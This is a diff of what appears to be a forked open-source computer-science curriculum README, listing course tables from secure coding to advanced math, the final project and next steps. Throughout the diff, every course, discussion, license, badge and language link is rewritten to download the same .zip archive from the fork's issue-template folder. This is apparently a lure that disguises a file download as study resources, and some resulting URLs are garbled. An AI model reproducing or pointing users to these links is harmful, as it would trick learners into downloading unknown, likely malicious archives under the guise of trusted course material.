+[Principles of Secure Coding](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)| 4 weeks | 4 hours/week | - | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Identifying Security Vulnerabilities](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 4 weeks | 4 hours/week | - | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
 
 Choose **one** of the following:
 
 Courses | Duration | Effort | Prerequisites | Discussion
 :-- | :--: | :--: | :--: | :--:
-[Identifying Security Vulnerabilities in C/C++Programming](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 4 weeks | 5 hours/week | - | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Exploiting and Securing Vulnerabilities in Java Applications](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 4 weeks | 5 hours/week | - | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
+[Identifying Security Vulnerabilities in C/C++Programming](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 4 weeks | 5 hours/week | - | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Exploiting and Securing Vulnerabilities in Java Applications](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 4 weeks | 5 hours/week | - | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
 
 ### Core applications
 
@@ -293,12 +293,12 @@ Courses | Duration | Effort | Prerequisites | Discussion
 
 Courses | Duration | Effort | Prerequisites | Discussion
 :-- | :--: | :--: | :--: | :--:
-[Databases: Modeling and Theory](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)| 2 weeks | 10 hours/week | core programming | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Databases: Relational Databases and SQL](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)| 2 weeks | 10 hours/week | core programming | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Databases: Semistructured Data](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)| 2 weeks | 10 hours/week | core programming | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Machine Learning](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)| 11 weeks | 4-6 hours/week | linear algebra | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Computer Graphics](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)| 6 weeks | 12 hours/week | C++ or Java, linear algebra | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Software Engineering: Introduction](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 6 weeks | 8-10 hours/week | Core Programming, and a [sizable project](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
+[Databases: Modeling and Theory](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)| 2 weeks | 10 hours/week | core programming | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Databases: Relational Databases and SQL](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)| 2 weeks | 10 hours/week | core programming | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Databases: Semistructured Data](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)| 2 weeks | 10 hours/week | core programming | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Machine Learning](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)| 11 weeks | 4-6 hours/week | linear algebra | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Computer Graphics](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)| 6 weeks | 12 hours/week | C++ or Java, linear algebra | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Software Engineering: Introduction](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 6 weeks | 8-10 hours/week | Core Programming, and a [sizable project](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
 
 ### Core ethics
 
@@ -312,9 +312,9 @@ Courses | Duration | Effort | Prerequisites | Discussion
 
 Courses | Duration | Effort | Prerequisites | Discussion
 :-- | :--: | :--: | :--: | :--:
-[Ethics, Technology and Engineering](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)| 9 weeks | 2 hours/week | none | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Introduction to  Intellectual Property](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)| 4 weeks | 2 hours/week | none | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Data Privacy Fundamentals](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)| 3 weeks | 3 hours/week | none | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
+[Ethics, Technology and Engineering](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)| 9 weeks | 2 hours/week | none | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Introduction to  Intellectual Property](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)| 4 weeks | 2 hours/week | none | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Data Privacy Fundamentals](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)| 3 weeks | 3 hours/week | none | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
 
 ## Advanced CS
 
@@ -335,14 +335,14 @@ But students should take *every* course that is relevant to the field they inten
 
 Courses | Duration | Effort | Prerequisites
 :-- | :--: | :--: | :--:
-[Parallel Programming](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)| 4 weeks | 6-8 hours/week | Scala programming
-[Compilers](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 9 weeks | 6-8 hours/week | none
-[Introduction to Haskell](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip~cis194/fall16/)| 14 weeks | - | -
-[Learn Prolog Now!](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) ([alt](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip))*| 12 weeks | - | -
-[Software Debugging](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)| 8 weeks | 6 hours/week | Python, object-oriented programming
-[Software Testing](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 4 weeks | 6 hours/week | Python, programming experience
+[Parallel Programming](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)| 4 weeks | 6-8 hours/week | Scala programming
+[Compilers](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 9 weeks | 6-8 hours/week | none
+[Introduction to Haskell](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip~cis194/fall16/)| 14 weeks | - | -
+[Learn Prolog Now!](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) ([alt](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip))*| 12 weeks | - | -
+[Software Debugging](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)| 8 weeks | 6 hours/week | Python, object-oriented programming
+[Software Testing](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 4 weeks | 6 hours/week | Python, programming experience
 
-(*) book by Blackburn, Bos, Striegnitz (compiled from [source](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip), redistributed under [CC license](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip))
+(*) book by Blackburn, Bos, Striegnitz (compiled from [source](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip), redistributed under [CC license](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip))
 
 ### Advanced systems
 
@@ -364,9 +364,9 @@ Courses | Duration | Effort | Prerequisites
 
 Courses | Duration | Effort | Prerequisites | Notes
 :-- | :--: | :--: | :--: | :--:
-[Computation Structures 1: Digital Circuits](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip+6.004.1x_3+3T2016) [alt1](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) [alt2 ](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 10 weeks | 6 hours/week | [Nand2Tetris II](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | Alternate links contain all 3 courses.
-[Computation Structures 2: Computer Architecture](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip+6.004.2x+3T2015) | 10 weeks | 6 hours/week | Computation Structures 1 |
-[Computation Structures 3: Computer Organization](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip+6.004.3x_2+1T2017) | 10 weeks | 6 hours/week | Computation Structures 2 |
+[Computation Structures 1: Digital Circuits](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip+6.004.1x_3+3T2016) [alt1](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) [alt2 ](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 10 weeks | 6 hours/week | [Nand2Tetris II](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | Alternate links contain all 3 courses.
+[Computation Structures 2: Computer Architecture](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip+6.004.2x+3T2015) | 10 weeks | 6 hours/week | Computation Structures 1 |
+[Computation Structures 3: Computer Organization](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip+6.004.3x_2+1T2017) | 10 weeks | 6 hours/week | Computation Structures 2 |
 
 ### Advanced theory
 
@@ -388,29 +388,29 @@ Courses | Duration | Effort | Prerequisites | Notes
 
 Courses | Duration | Effort | Prerequisites
 :-- | :--: | :--: | :--:
-[Theory of Computation](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) ([alt](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)) | 13 weeks | 10 hours/week | [Mathematics for Computer Science](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip+6.042J+2T2019/about), logic, algorithms
-[Computational Geometry](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 16 weeks | 8 hours/week | algorithms, C++
-[Game Theory](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 8 weeks | 3 hours/week | mathematical thinking, probability, calculus
+[Theory of Computation](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) ([alt](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)) | 13 weeks | 10 hours/week | [Mathematics for Computer Science](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip+6.042J+2T2019/about), logic, algorithms
+[Computational Geometry](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 16 weeks | 8 hours/week | algorithms, C++
+[Game Theory](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 8 weeks | 3 hours/week | mathematical thinking, probability, calculus
 
 ### Advanced Information Security
 
 Courses | Duration | Effort | Prerequisites
 :-- | :--: | :--: | :--:
-[Web Security Fundamentals](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 5 weeks | 4-6 hours/week | understanding basic web technologies
-[Security Governance & Compliance](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 3 weeks | 3 hours/week | -
-[Digital Forensics Concepts](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 3 weeks | 2-3 hours/week | Core Security
-[Secure Software Development: Requirements, Design, and Reuse](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 7 weeks | 1-2 hours/week | Core Programming and Core Security
-[Secure Software Development: Implementation](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 7 weeks | 1-2 hours/week | Secure Software Development: Requirements, Design, and Reuse
-[Secure Software Development: Verification and More Specialized Topics](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 7 weeks | 1-2 hours/week | Secure Software Development: Implementation
+[Web Security Fundamentals](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 5 weeks | 4-6 hours/week | understanding basic web technologies
+[Security Governance & Compliance](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 3 weeks | 3 hours/week | -
+[Digital Forensics Concepts](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 3 weeks | 2-3 hours/week | Core Security
+[Secure Software Development: Requirements, Design, and Reuse](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 7 weeks | 1-2 hours/week | Core Programming and Core Security
+[Secure Software Development: Implementation](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 7 weeks | 1-2 hours/week | Secure Software Development: Requirements, Design, and Reuse
+[Secure Software Development: Verification and More Specialized Topics](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 7 weeks | 1-2 hours/week | Secure Software Development: Implementation
 
 ### Advanced math
 Courses | Duration | Effort | Prerequisites | Discussion
 :-- | :--: | :--: | :--: | :--:
-[Essence of Linear Algebra](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | - | - | [high school math](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Linear Algebra](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 14 weeks | 12 hours/week | corequisite: Essence of Linear Algebra | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Introduction to Numerical Methods](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)| 14 weeks | 12 hours/week | [Linear Algebra](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Introduction to Formal Logic](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 10 weeks | 4-8 hours/week | [Set Theory](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Probability](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 15 weeks | 5-10 hours/week | [Differentiation and Integration](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | [chat](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
+[Essence of Linear Algebra](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | - | - | [high school math](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Linear Algebra](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 14 weeks | 12 hours/week | corequisite: Essence of Linear Algebra | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Introduction to Numerical Methods](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)| 14 weeks | 12 hours/week | [Linear Algebra](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Introduction to Formal Logic](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 10 weeks | 4-8 hours/week | [Set Theory](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Probability](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 15 weeks | 5-10 hours/week | [Differentiation and Integration](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | [chat](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
 
 ## Final project
 
@@ -420,33 +420,33 @@ The assignments and exams for each course are to prepare you to use your knowled
 After you've gotten through all of Core CS and the parts of Advanced CS relevant to you, you should think about a problem that you can solve using the knowledge you've acquired.
 Not only does real project work look great on a resume, but the project will also validate and consolidate your knowledge.
 You can create something entirely new, or you can find an existing project that needs help via websites like
-[CodeTriage](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
+[CodeTriage](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
 or
-[First Timers Only](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip).
+[First Timers Only](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip).
 
 Students who would like more guidance in creating a project may choose to use a series of project oriented courses. Here is a sample of options (many more are available, at this point you should be capable of identifying a series that is interesting and relevant to you):
 
 Courses | Duration | Effort | Prerequisites
 :-- | :--: | :--: | :--:
-[Fullstack Open](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 12 weeks | 15 hours/week | programming
-[Modern Robotics (Specialization)](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 26 weeks | 2-5 hours/week | freshman-level physics, linear algebra, calculus, [linear ordinary differential equations](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
-[Data Mining (Specialization)](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 30 weeks | 2-5 hours/week | machine learning
-[Big Data (Specialization)](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 30 weeks | 3-5 hours/week | none
-[Internet of Things (Specialization)](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 30 weeks | 1-5 hours/week | strong programming
-[Cloud Computing (Specialization)](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 30 weeks | 2-6 hours/week | C++ programming
-[Data Science (Specialization)](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 43 weeks | 1-6 hours/week | none
-[Functional Programming in Scala (Specialization)](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 29 weeks | 4-5 hours/week | One year programming experience
-[Game Design and Development with Unity 2020 (Specialization)](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) | 6 months | 5 hours/week | programming, interactive design
+[Fullstack Open](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 12 weeks | 15 hours/week | programming
+[Modern Robotics (Specialization)](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 26 weeks | 2-5 hours/week | freshman-level physics, linear algebra, calculus, [linear ordinary differential equations](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
+[Data Mining (Specialization)](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 30 weeks | 2-5 hours/week | machine learning
+[Big Data (Specialization)](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 30 weeks | 3-5 hours/week | none
+[Internet of Things (Specialization)](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 30 weeks | 1-5 hours/week | strong programming
+[Cloud Computing (Specialization)](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 30 weeks | 2-6 hours/week | C++ programming
+[Data Science (Specialization)](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 43 weeks | 1-6 hours/week | none
+[Functional Programming in Scala (Specialization)](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 29 weeks | 4-5 hours/week | One year programming experience
+[Game Design and Development with Unity 2020 (Specialization)](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) | 6 months | 5 hours/week | programming, interactive design
 
 ### Evaluation
 
 Upon completing your final project:
-- Submit your project's information to [PROJECTS](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) via a pull request.
+- Submit your project's information to [PROJECTS](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) via a pull request.
 - Put the OSSU-CS badge in the README of your repository!
-[![Open Source Society University - Computer Science](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)
+[![Open Source Society University - Computer Science](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)
 
-  - Markdown: `[![Open Source Society University - Computer Science](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)`
-  - HTML: `<a href="https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip"><img alt="Open Source Society University - Computer Science" src="https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip"></a>`
+  - Markdown: `[![Open Source Society University - Computer Science](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)`
+  - HTML: `<a href="https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip"><img alt="Open Source Society University - Computer Science" src="https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip"></a>`
 - Use our [community](#community) channels to announce it to your fellow students.
 
 Solicit feedback from your OSSU peers.
@@ -477,23 +477,23 @@ After completing the requirements of the curriculum above, you will have complet
 What is next for you? The possibilities are boundless and overlapping:
 
 - Look for a job as a developer!
-- Check out the [readings](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip) for classic books you can read that will sharpen your skills and expand your knowledge.
-- Join a local developer meetup (e.g. via [https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip)).
+- Check out the [readings](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip) for classic books you can read that will sharpen your skills and expand your knowledge.
+- Join a local developer meetup (e.g. via [https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip](https://github.com/AvishekInvincible/computer-science/raw/refs/heads/master/.github/ISSUE_TEMPLATE/science_computer_v2.8.zip)).
 - Pay attention to emerging technologies in the world of software development:
-  + Explore the **actor model** through [Elixir](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip), a new functional programming language for the web based on the battle-tested Erlang Virtual Machine!
-  + Explore **borrowing and lifetimes** through [Rust](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip), a systems language which achieves memory- and thread-safety without a garbage collector!
-  + Explore **dependent type systems** through [Idris](https://raw.githubusercontent.com/AvishekInvincible/computer-science/master/extras/computer-science-v1.3.zip), a new Haskell-inspired language with unprecedented support for type-driven development.
